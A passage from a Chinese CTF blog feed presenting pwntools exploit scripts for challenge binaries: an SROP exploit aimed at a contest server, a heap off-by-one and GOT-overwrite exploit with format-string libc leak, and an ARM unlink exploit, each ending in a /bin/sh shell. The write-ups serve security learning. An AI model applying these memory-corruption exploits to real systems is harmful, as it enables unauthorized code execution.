class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-19 23:10:33</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> time</div><div class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"amd64"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line">target = <span class="string">"./smallest"</span></div><div class="line">remote_ip = <span class="string">"106.75.61.55"</span></div><div class="line">port = <span class="number">20000</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsi = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rdx = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rsp = <span class="number">0xdeadbeaf</span></div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line"><span class="comment"># write</span></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)+p64(<span class="number">0x4000B3</span>)+p64(<span class="number">0x4000B0</span>)</div><div class="line">sd(payload)</div><div class="line">sd(<span class="string">"\xb3"</span>)</div><div class="line"></div><div class="line"></div><div class="line">stack_addr = u64(p.recv(<span class="number">16</span>)[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x1000</span></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line"></div><div class="line"><span class="comment"># frame </span></div><div class="line"><span class="comment"># call read into stack_addr</span></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_read</div><div class="line">frame.rdi = <span class="number">0x0</span></div><div class="line">frame.rsi = stack_addr</div><div class="line">frame.rdx = <span class="number">0x400</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#frame</span></div><div class="line"><span class="comment"># write /bin/sh</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = stack_addr+<span class="number">0x150</span></div><div class="line">frame.rsi = <span class="number">0x0</span></div><div class="line">frame.rdx = <span class="number">0x0</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000Be</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x150</span>-len(payload))+<span class="string">"/bin/sh\x00"</span></div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>用到了很多姿势啊，台湾友人的pwn很强悍，hhhhhhh。</p><p>参考链接：<a href="http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/" target="_blank" rel="external">http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/</a></p><p>非常坑的一点是，在ubuntu16.04下，scanf操作会在heap区域生成最少0x410大小的chunk。。。如果不知道这一点，这题是没法做的。（一定要在ubuntu16.04环境下测试该题哦~</p><p>步骤：</p><p>1、利用scanf在heap区域生成0x1000大小的chunk，在末尾伪造chunk头，注意调整合适的size。我这边调整为0x70的 chunk size</p><p>2、利用null字节溢出导致虚表指针最低位字节变成00字节，指向我们伪造的fake chunk<br>（注意，fake chunk是位于0x18大小的chunk之前的，<br>）</p><p>3、free fake chunk 在下次new的时候，我们申请同样大小的chunk，会从fastbin中拿到我们刚才伪造的fake chunk，同时可以输入内容，覆盖虚表指针，导致任意地址写。。</p><p>4、我们可以利用2操作覆盖掉got表，修改exit为alarm，使我们可以重复利用1、2、3函数。</p><p>5、修改atoi为printf（这姿势第一次），然后通过格式化字符串泄露libc</p><p>6、再次覆写got ，将atoi改成system就好啦。。需要注意的是，printf返回值是他显示的字符数~</p><p>非常nice的一题pwn，收获很大~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># off-by-one</span></div><div class="line"><span class="comment"># fastbin attack</span></div><div class="line"><span class="comment"># overwrite got</span></div><div class="line"><span class="comment"># fmt</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-20 03:15:30</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./hiddenlove"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment">#gdb.attach(p,"b*0x400B48\nb*0x400A1A\nc")</span></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x4008f4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 0</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"s for her?(Y/N)\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x1000</span><span class="number">-0x20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</div><div class="line"></div><div class="line"><span class="comment">## stage 1</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x20</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"\x00"</span>*<span class="number">8</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,data)</span>:</span></div><div class="line"><span class="comment">## stage 2</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line"></div><div class="line"><span class="comment">## stage 3 </span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x60</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(addr))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"b"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># stage 4</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line"></div><div class="line">sd(data)</div><div class="line"></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">edit(rop.got[<span class="string">"free"</span>],payload)</div><div class="line"></div><div class="line"><span class="comment"># leak</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"puts"</span>]))</div><div class="line">puts_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="comment"># read(0,buf,0x10)</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"printf"</span>]))<span class="comment"># dl_reslove change printf_got</span></div><div class="line">printf_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(libc.symbols[<span class="string">"puts"</span>]-libc.symbols[<span class="string">"system"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(system_addr)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">sd(<span class="string">"aa"</span>) <span class="comment"># I have changed atoi to printf,so it return the number of my input chars</span></div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment"># it's a funny pwn ~~~</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。&lt;/p&gt;
&lt;p&gt;不过pwn1和pwn2收获都很大，特别记录下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>arm_double_free_attack</title>
    <link href="https://winter3un.github.io/2017/04/10/arm-double-free-attack/"/>
    <id>https://winter3un.github.io/2017/04/10/arm-double-free-attack/</id>
    <published>2017-04-10T15:50:31.000Z</published>
    <updated>2017-04-10T15:56:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。</p><p>简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chunk，果然基础弱渣在这里是无法生存的。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-09 08:34:41</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./note"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,data)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(length))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"the id:"</span>)</div><div class="line">sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(index))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>)+p32(addr))</div><div class="line">edit(<span class="number">0</span>,data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 unlink</span></div><div class="line">add(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x8</span>)<span class="comment">#0</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#1  &gt;=0x200会使用large chunk</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#2</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#3</span></div><div class="line">junk = <span class="string">"\x00"</span>*<span class="number">8</span></div><div class="line">head = p32(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">fake_head = p32(<span class="number">0</span>)+p32(<span class="number">0x101</span>)</div><div class="line">fd = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0xc</span>)</div><div class="line">bk = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0x8</span>)</div><div class="line">payload  = junk+head</div><div class="line">payload += fake_head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x100</span>-len(fake_head+fd+bk))</div><div class="line">payload += p32(<span class="number">0x100</span>)+p32(<span class="number">0x108</span>)</div><div class="line">edit(<span class="number">0</span>,payload)</div><div class="line">raw_input()</div><div class="line">dele(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 edit free_got</span></div><div class="line">edit_anyaddr(<span class="number">0x12024</span>,p32(<span class="number">0x8538</span>)[:<span class="number">-1</span>])<span class="comment">#有零字节溢出，会破坏下一个got</span></div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。&lt;/p&gt;
&lt;p&gt;简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chun
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap overflow" scheme="https://winter3un.github.io/tags/heap-overflow/"/>
    
      <category term="arm" scheme="https://winter3un.github.io/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】 初探pwntools fmt特性</title>
    <link href="https://winter3un.github.io/2017/04/09/%E5%88%9D%E6%8E%A2pwntools-fmt%E7%89%B9%E6%80%A7/"/>
    <id>https://winter3un.github.io/2017/04/09/初探pwntools-fmt特性/</id>
    <published>2017-04-09T15:16:41.000Z</published>
    <updated>2017-04-09T15:18:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。</p><p>官方文档链接  <a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="external">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p><p>在本地一看，pwntools还是2.x版本。。官方都已经更新到3.5版本了，于是果断更新= =。。</p><p>漏洞程序是这样子的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-184h]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+9Ch] [bp-104h]@2</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+11Ch] [bp-84h]@2</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+19Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  print_welcome();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"First input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Second input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v4);</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">44</span>);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</div><div class="line">    <span 